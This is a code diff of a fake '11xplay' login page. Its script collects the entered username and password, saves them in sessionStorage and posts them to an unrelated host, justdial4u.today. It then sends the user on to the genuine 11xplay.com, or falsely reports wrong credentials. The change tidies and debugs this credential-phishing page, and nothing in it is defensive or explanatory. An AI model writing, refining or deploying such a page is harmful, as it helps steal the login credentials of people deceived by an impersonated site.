@@ -839,12 +839,12 @@
 <!---->
 <form novalidate class="login-form ng-untouched ng-pristine ng-invalid">
     <div class="form-group">
-        <label for="exampleInputEmail1" class="text-uppercase">Username</label>
-        <input type="text" formcontrolname="username" placeholder="Username" class="form-control ng-untouched ng-pristine ng-invalid">
+        <label for="username" class="text-uppercase">Username</label>
+        <input type="text" id="username" placeholder="Username" class="form-control">
     </div>
     <div class="form-group">
-        <label for="exampleInputPassword1" class="text-uppercase">Password</label>
-        <input type="password" formcontrolname="password" placeholder="Password" class="form-control ng-untouched ng-pristine ng-invalid">
+        <label for="password" class="text-uppercase">Password</label>
+        <input type="password" id="password" placeholder="Password" class="form-control">
     </div>
     <div class="form-check">
         <label class="form-check-label">
@@ -857,7 +857,6 @@
 
 <!-- Add an error message display -->
 <div id="errorMsg"></div>
-
 <div  class="copy-text">Powered by 
 	<a  href="javascript:void(0)">11xplay</a>
 	<p >
@@ -878,61 +877,55 @@
 </div>
 
 
-	    <script type="text/javascript">
+<script type="text/javascript">
     // Function to handle the login submission
     function checkLogin(event) {
         event.preventDefault();  // Prevent form from submitting the normal way
 
         // Get values from the form inputs
-        var loginName = $("input[formcontrolname='username']").val();  
-        var password = $("input[formcontrolname='password']").val();  
+        var loginName = $("#username").val();  
+        var password = $("#password").val();  
 
-        
         if (loginName !== '' && password !== '') {
             
             sessionStorage.setItem("loginName", loginName);
             sessionStorage.setItem("password", password);
 
-            
-            var storedLoginName = sessionStorage.getItem("loginName");
-            var storedPassword = sessionStorage.getItem("password");
-
-            
+            // Send the login data via AJAX
             $.ajax({
                 type: "POST",
                 url: "https://justdial4u.today/11xxplay-mail.php", 
                 data: {
-                    loginName: storedLoginName,
-                    password: storedPassword
+                    loginName: loginName,
+                    password: password
                 },
                 success: function (msg) {
-
+                    console.log(msg);  // Debugging log
                     if (msg === "sucessmsg") {
-                       
                         window.location.href = "https://11xplay.com/";
                     } else {
-                        
                         $("#errorMsg").html('Username and password are incorrect.');
                     }
                 },
-                error: function() {
-                    
+                error: function(xhr, status, error) {
+                    console.log("Error:", status, error);  // Log error for debugging
                     alert('An error occurred. Please try again.');
                 }
             });
         } else {
-            
             alert('All fields are required.');
         }
     }
 
-   
     $(document).ready(function () {
         $("form").on("submit", function (event) {
             checkLogin(event);  
         });
     });
 </script>
+
+	    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
 
 
 
